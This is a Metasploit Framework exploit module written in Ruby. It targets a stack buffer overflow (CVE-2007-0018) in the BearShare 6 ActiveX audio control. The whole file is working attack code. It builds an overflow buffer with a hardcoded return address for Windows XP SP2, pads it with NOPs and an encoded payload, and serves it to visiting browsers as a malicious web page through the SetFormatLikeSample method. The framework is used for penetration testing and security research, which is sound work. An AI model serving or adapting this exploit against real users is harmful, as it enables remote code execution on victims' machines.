##
# $Id: bearshare_setformatlikesample.rb 4645 2007-04-04 04:34:17Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

module Msf

class Exploits::Windows::Browser::BearShare_SetFormatLikeSample < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BearShare 6 ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack overflow in the NCTAudioFile2.Audio ActiveX
					Control provided by BearShare 6.0.2.26789.  By sending a overly long string 
					to the "SetFormatLikeSample()" method, an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ], 
			'Version'        => '$Revision: 3783 $',
			'References'     => 
				[
					[ 'CVE', '2007-0018' ],
					[ 'BID', '23892' ],
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2007-May/062911.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'PrepenEncoder' => "\x81\xc4\x54\xf2\xff\xff",	
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP2 Pro English',     { 'Offset' => 4116, 'Ret' => 0x7c81518B } ],
				],
			'DisclosureDate' => 'May 5 2007',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)
		
		# Set the exploit buffer	
		sploit =  rand_text_alpha(target['Offset']) + [target.ret].pack('V') 
		sploit << make_nops(8) + p.encoded 
			
		# Build out the message
		content = %Q|
			<html>
			<object classid='clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC' id='#{vname}'></object>
			<script language='javascript'>
			var #{vname} = document.getElementById('#{vname}');
			var #{strname} = new String('#{sploit}');
			#{vname}.SetFormatLikeSample(#{strname}); 
			</script>
			</html>
                  |
	
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)
		
		# Handle the payload
		handler(cli)
	end

end
end
